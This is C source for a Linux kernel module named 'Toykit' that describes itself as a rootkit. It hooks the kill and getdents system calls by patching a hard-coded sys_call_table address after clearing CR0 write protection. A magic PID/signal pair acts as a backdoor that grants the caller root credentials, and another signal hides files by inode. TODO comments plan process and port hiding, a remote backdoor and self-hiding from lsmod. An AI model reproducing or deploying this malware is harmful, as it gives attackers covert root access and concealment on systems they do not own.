#include <asm/unistd.h>
#include <linux/highmem.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/list.h>

// TODO 
// Hide files and processes
// Hide ports and add remote backdoor
// Hide self from lsmod and other commands
// Find the sys_call_table programmatically
// Cite sources and document

// for local backdoor
#define LOCAL_PID 12345
#define LOCAL_SIG 31

// for controlling the file hider
#define HIDE_SIG 16

// for writing to sys_call_table
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

unsigned long *sys_call_table = (unsigned long*)0xc15b0000;  // hard coded, grep /boot/System.map

// for hijacking sys_kill
typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig); // for casting to avoid warnings
kill_ptr orig_kill;

static LIST_HEAD(hidden_files); // list of inodes to hide

struct hidden_file { // struct for list of inodes
	int inode;
	struct list_head list;
};

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	int actual_result;
	struct hidden_file *toAdd;

	// kill backdoor
	if (pid == LOCAL_PID && sig == LOCAL_SIG) {
		struct cred *cred;
		cred = (struct cred *)__task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->sgid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		return 0;
	}
	// file hiding, pid = inode of file to be hidden
	else if (sig == HIDE_SIG) { 
		toAdd = kmalloc(sizeof(struct hidden_file),GFP_KERNEL);
		toAdd->inode = pid;
		INIT_LIST_HEAD(&toAdd->list);
		list_add_tail(&toAdd->list,&hidden_files);
		return 0;
	}

	actual_result = (*orig_kill)(pid,sig);
	return actual_result;
}

// for hijacking sys_getdents
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[256];
	char pad;
	char d_type;
};

typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp,
                                       unsigned int count);
getdents_ptr orig_getdents;


asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
                               unsigned int count)
{
	int actual_result, i;
	struct hidden_file *ptr;
	struct linux_dirent toWorkWith;
	struct linux_dirent *forUser;

	// check user space access and allocate kernel space linux_dirent
	if (!access_ok(VERIFY_READ,dirp,count))
		return -1;
	if ((forUser = kmalloc(count,GFP_KERNEL)) == NULL)
		return -1;

	// run real getdent and check result for files to hide
	actual_result = (*orig_getdents)(fd,dirp,count);
	if (actual_result > 0) { // actually read some bytes
		for (i = 0; i < actual_result / sizeof(struct linux_dirent); i++) {
			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent))) // (dirp + i)->d_reclen))
				return -1;
			list_for_each_entry(ptr,&hidden_files,list) {
				if (toWorkWith.d_ino == ptr->inode)
					continue;
			}
			*forUser++ = toWorkWith;
		}
	}

	// copy linux_dirent * to user space
	if (!access_ok(VERIFY_WRITE,dirp,count))
		return -1;
	if (copy_to_user(dirp,forUser,count))
		return -1;

	// return actual result
	return actual_result;
}

int rootkit_init(void) {
	GPF_DISABLE;

	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;

	orig_getdents = (getdents_ptr)sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;

	GPF_ENABLE;
	printk(KERN_INFO "Loading rootkit\n");
    	return 0;
}

void rootkit_exit(void) {
	struct hidden_file *ptr, *next;
	//list_for_each_entry(ptr,&hidden_files,list) {
	//	printk(KERN_INFO "Inode: %d\n",ptr->inode);
	//}

	GPF_DISABLE;
	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	GPF_ENABLE;

	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
		list_del(&ptr->list);
		kfree(ptr);
	}
	printk(KERN_INFO "Removing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Toykit");
MODULE_AUTHOR("Josh Imhoff");
